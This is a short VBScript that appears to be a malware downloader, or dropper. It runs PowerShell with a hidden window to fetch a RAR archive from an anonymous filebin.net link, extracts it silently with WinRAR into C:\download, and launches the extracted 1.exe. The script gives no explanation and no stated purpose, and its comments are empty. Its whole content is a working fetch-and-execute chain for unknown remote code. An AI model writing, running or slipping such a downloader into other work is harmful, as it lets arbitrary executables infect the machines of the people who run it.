Set objShell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

' 
If Not fso.FolderExists("C:\download") Then
    fso.CreateFolder("C:\download")
End If

command = "powershell -Command ""Start-BitsTransfer -Source 'https://filebin.net/mh6w10ul6h61xs3y/exe.win-amd64-3.11.rar' -Destination 'C:\download\exe.win-amd64-3.11.rar'"""
objShell.Run command, 0, True

' 
If fso.FileExists("C:\download\exe.win-amd64-3.11.rar") Then
    ' 
    command = """C:\Program Files\WinRAR\WinRAR.exe"" x -y ""C:\download\exe.win-amd64-3.11.rar"" ""C:\download\\"""
    objShell.Run command, 0, True
    
    ' 
    command = """C:\download\1.exe"""
    objShell.Run command, 1, True
Else
    MsgBox ""
End If
